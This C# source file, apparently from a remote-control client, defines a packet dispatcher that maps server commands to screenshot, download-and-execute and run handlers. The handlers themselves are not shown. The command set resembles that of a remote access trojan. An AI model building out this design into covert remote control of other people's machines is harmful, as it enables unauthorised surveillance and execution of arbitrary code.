namespace ClientCore.Handle
{
    using Arrowgene.Services.Logging;
    using Arrowgene.Services.Network.MarrySocket.MClient;
    using ClientCore.Packets;
    using NetworkObjects;
    using System;
    using System.Collections.Generic;
    using System.Net;

    public class HandlePacket
    {
        private Logger logger;
        private Dictionary<int, IHandlePacket> clientPacketIds;

        public HandlePacket(Logger logger)
        {
            this.logger = logger;
            this.clientPacketIds = new Dictionary<int, IHandlePacket>();
            this.InitPacketIds();
        }

        private void InitPacketIds()
        {
            this.clientPacketIds.Add(PacketId.SCREEN_SHOT, new HandleScreenshot());
            this.clientPacketIds.Add(PacketId.DOWNLOAD_AND_EXECUTE, new HandleDownloadExec());
            this.clientPacketIds.Add(PacketId.RUN, new HandleRun());
        }

        public void Handle(int packetId, object receivedClass, ServerSocket serverSocket)
        {
            if (clientPacketIds.ContainsKey(packetId))
            {
                this.clientPacketIds[packetId].Handle(receivedClass, serverSocket);
            }
            else
            {
                logger.Write(String.Format("Could not handle packet: {0}", packetId), LogType.PACKET);
            }
        }

        public void Send(ServerSocket serverSocket, ISendPacket iSendPacket)
        {
            iSendPacket.Send(serverSocket);
        }
    }
}
